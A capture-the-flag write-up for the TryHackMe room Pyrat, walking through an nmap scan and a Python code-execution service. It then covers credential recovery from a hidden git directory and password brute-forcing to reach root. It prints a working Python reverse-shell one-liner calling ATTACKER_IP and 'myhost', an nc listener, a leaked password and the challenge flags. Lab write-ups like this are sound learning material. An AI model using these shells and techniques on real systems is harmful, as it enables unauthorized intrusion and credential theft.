# Day 8
---

## **Room:** [Pyrat](https://tryhackme.com/room/pyrat)

> **Prompt**
>
> > Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
---

### Walkthrough

After I ran the Nmap scan:
```bash
nmap -sV -sC 10.201.33.16
```
I found these open ports:

>22 — ssh (OpenSSH)

>8000 — http-alt (SimpleHTTP)

I edited /etc/hosts with sudo nano /etc/hosts so pyrat.thm pointed to 10.201.33.16, then browsed to http://pyrat.thm:8000/. The web page gave a clue: “Try a more basic connection!” Attempting to connect to port 22 returned “This address is restricted,” so I focused on the HTTP service.

I used a reverse shell to get a remote shell. The Python one-liner I used on the target (with the attacker IP and port replaced) was:

```bash
socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
```
I connected from the web interface with:
```bash
nc pyrat.thm 8000
socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("myhost",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
On my side I listened with:
```bash
nc -lvnp 1337
```
Using these commands I gained access to the host. I ran linPEAS and found a hidden .git directory at /opt/dev. From the git history I recovered credentials for the user think: _TH1NKINGPirate$_. I used that password to SSH into the machine as think and found the first flag:
```text
996bdb1f619a68361417cabca5454705
```
While inspecting the git repository, I restored a deleted file from commit 0a3c36d66369fd4b07ddca72e5379461a63470bf and recovered this snippet:
```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
```
From the repository I found the GitHub account joselmwdf@github.com/pyrat. The service exposed an admin login on the host via nc pyrat.thm 8000. After a few wrong attempts I realized the service leaked hints on failed passwords, so I wrote a Python script to brute-force using those hints. I recovered the admin password:
```nginx
abc123
```
With the root credentials I obtained the final root flag:
```text
ba5ed03e9e74bb98054438480165e221
```

